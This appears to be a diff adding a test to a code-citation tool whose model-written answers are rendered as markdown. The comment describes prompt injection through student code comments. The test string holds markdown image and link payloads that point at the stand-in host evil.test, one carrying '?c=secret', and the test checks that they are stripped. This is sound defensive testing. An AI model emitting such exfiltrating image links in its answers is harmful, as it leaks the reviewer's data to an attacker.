@@ -58,6 +58,13 @@ assert r["answer"] == "Defined in [1] and [1, 2], see." and [x["n"] for x in r["
 assert r["citations"][0] == {"n": 1, "file": hits[0]["file"], "start": hits[0]["start"], "end": hits[0]["end"],
                              "code": hits[0]["text"]}
 assert ask.cite("Nothing to cite [7].", hits) == {"answer": ask.NOT_FOUND, "citations": []}
+# A comment in student code can steer the model (prompt injection). The answer is rendered as markdown, so an image
+# would make the reviewer's browser fetch a URL carrying code; a link could phish. Only the text may survive.
+evil = ("Copied [1]. ![x](https://evil.test/?c=secret) ![y][r] see [here](https://evil.test) and [1](https://evil.test)"
+        " ![a [b]](https://evil.test/n)\n\n[r]: https://evil.test/ref")
+r = ask.cite(evil, hits)
+assert "secret" not in r["answer"] and "](" not in r["answer"] and "[r]:" not in r["answer"], r["answer"]
+assert "see here" in r["answer"] and [x["n"] for x in r["citations"]] == [1], r
 
 # no key, no chat box
 os.environ.pop("LLM_API_KEY", None)
